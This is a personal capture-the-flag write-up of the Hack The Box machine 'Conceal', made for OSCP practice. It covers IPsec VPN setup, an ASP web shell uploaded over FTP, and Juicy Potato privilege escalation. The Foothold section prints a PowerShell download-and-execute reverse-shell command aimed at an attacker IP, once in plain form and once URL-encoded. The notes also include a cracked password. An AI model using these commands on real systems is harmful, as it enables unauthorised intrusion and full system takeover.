# Conceal HelpThrough

Name: Conceal
Date:  13/11/2022
Difficulty: Hard 
Goals: OSCP Prep
Learnt:
- snmp-check output is bonkers
- 5353 (multicat dns)
- 5355 (LLMNR) - responder catch hashes from this 
- ike-scan -m  for better output
- Ipsec
- Setting up VPN servers
- nmap does not SYN through a VPN
- Strongswan is very picky
- Simple asp shell is best shell
- CLSID Keys
- Batch files to do IEX powershell reverse shelling

Having a bad hardware day... Therefore to keep the proverbial paddling  of a good life going ever on, Ippsec video on standby to learn why this box is so hard to enumerate and how I can encorporate more diligence when facing challenges that do not want to be found.

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Conceal/Screenshots/ping.png)

[isakmp](https://en.wikipedia.org/wiki/Internet_Security_Association_and_Key_Management_Protocol)

I did an Ikescan to find this, awhile ago knowing the box is hard. Just here to learn and textual fill in the gaps,:

```
CONCEAL : 9C8B1A372B1878851BE2C097031B6E43
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
```

On hearing the introduction I have never step up a vpn from nothing. So I will also do that. 

![](ntlmdudecake.png)

`Dudecake1!`

```bash
snmp-check -l 
```

At this point I fired up researching Ipsec protocol, because I think I have not covered it much to liTTLe in my notes. The VPN protocol - it authenicates and encrypts packets to provide secure communication between two computer. I will release my articles on making my own tomorrow evening along with the Ipsec related information. [Strongswan](https://en.wikipedia.org/wiki/StrongSwan) is apparently really complex and frail as of 4 years ago, will look into a better version. I looked into OpenVPN, but I would need to transfer config.

We need to install strongswan, because we want to create a transport vpn because a tunnel mode would encrypt traffic were cant exchange or debug at the other end. Trouble IPsec with [https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html]. With some reading I decided to move on from this box until I need to make a VPN with Strongswan. I learnt about Ipsec, but Strongswan has evolved since, but
Ipsec manual and Ipsec.secrets, the Strongswan documentation is rough.

```bash
sudo apt install strongswan

# Ipsec.secrets
sudo vim /etc/ipsec.secrets
$ip %any : PSK "$Key" 

echo "
conn Conceal
        type=transport
        keyexchange=ikev1
        left=$IP
        leftprotoport=tcp
        right=$Coneals_IP
        rightprotoport=tcp
        authby=psk
        esp=3des-sha1
        fragmentation=yes
        ike=3des-sha1-modp1024
        ikelifetime=8h
        auto=start
" | sudo tee -a /etc/ipsec.conf

sudo ipsec start --nofork
# more issues change the maximum transmission unit 
# 
ifconfig tun0 mtu 1000 
```

![](wowvpninyourvpn.png)

At this point I thought I might as well pause the video and try hacking in from here for 30 minutes. 

## Exploit

FTP anonymous login with permissions to upload, but I cant print the directory or its contents. 
![](ftpupload.png)

Tried the webserver to see if it is link somehow. 
![1000](uploaddir.png)
No rcpclient, smb - retried uploading:
![](testing.png)

![](aspcmddoesnotwork.png)

Tried others and with aspx and failed. 

## Foothold 

I ended up using the very simple asp shell that is awesome from [0xdf](https://0xdf.gitlab.io/2019/05/18/htb-conceal.html)

```powershell
# The power of executing in memory powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.109/Invoke-PowerShellTcp.ps1')"
# Url encode
cmd=%70%6f%77%65%72%73%68%65%6c%6c%20%22%49%45%58%28%4e%65%77%2d%4f%62%6a%65%63%74%20%4e%65%74%2e%57%65%62%43%6c%69%65%6e%74%29%2e%64%6f%77%6e%6c%6f%61%64%53%74%72%69%6e%67%28%27%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%30%39%2f%49%6e%76%6f%6b%65%2d%50%6f%77%65%72%53%68%65%6c%6c%54%63%70%2e%70%73%31%27%29%22
```

![](boxon.png)



## PrivEsc

Having recently compile every Potato exploit under the sun in the last 10 hours. It will be nice that Juicy Potato will work
![1080](potatotime.png)

From 0xDF I learnt about CLSIDs.
[RTFM](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
A CLSID is a globally unique identifier that identifies a COM class object. If your server or container allows linking to its embedded objects, you need to register a CLSID for each supported class of objects.

`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}`

Nothing wants to run.
```
.\jp.exe -t * -l 9001 -p <put a batch file that pull another powershell reverse shell into memory> -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
# -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```


![](system.png)